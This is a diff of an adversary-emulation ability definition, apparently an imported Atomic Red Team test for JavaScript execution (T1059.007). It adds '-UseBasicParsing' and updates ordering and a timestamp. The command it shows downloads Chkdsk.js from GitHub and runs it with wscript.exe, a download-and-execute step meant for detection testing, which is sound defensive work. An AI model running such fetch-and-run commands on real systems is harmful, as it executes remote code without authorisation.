@@ -25,8 +25,8 @@
           0} else {exit 1}; then : ; else New-Item -ItemType Directory (Split-Path
           "PathToAtomicsFolder\T1059.007\src\Chkdsk.js") -Force | Out-Null; Invoke-WebRequest
           "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/Chkdsk.js"
-          -OutFile "PathToAtomicsFolder\T1059.007\src\Chkdsk.js"; fi; wscript.exe
-          /b "PathToAtomicsFolder\T1059.007\src\Chkdsk.js" -scan Kdw6gG7cpOSZsBeH'
+          -OutFile "PathToAtomicsFolder\T1059.007\src\Chkdsk.js" -UseBasicParsing;
+          fi; wscript.exe /b "PathToAtomicsFolder\T1059.007\src\Chkdsk.js" -scan Kdw6gG7cpOSZsBeH'
         elevation_required: false
   plugin: atomic
   singleton: false
@@ -34,8 +34,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - execution
+  - atomic-red-team
   - t1059.007
   author: Atomic Red Team
   additional_info:
@@ -53,9 +53,9 @@
         -Force | Out-Null
 
         Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/Chkdsk.js"
-        -OutFile "#{chkdsk_path}"
+        -OutFile "#{chkdsk_path}" -UseBasicParsing
 
         '
     technique_created: '2020-06-23T19:12:24.924Z'
     atomic_guid: 02428cbe-c230-4353-b31d-61c9d328b153
-    import_timestamp: '2026-10-20T07:08:27.695727Z'
+    import_timestamp: '2026-10-21T07:01:50.303009Z'
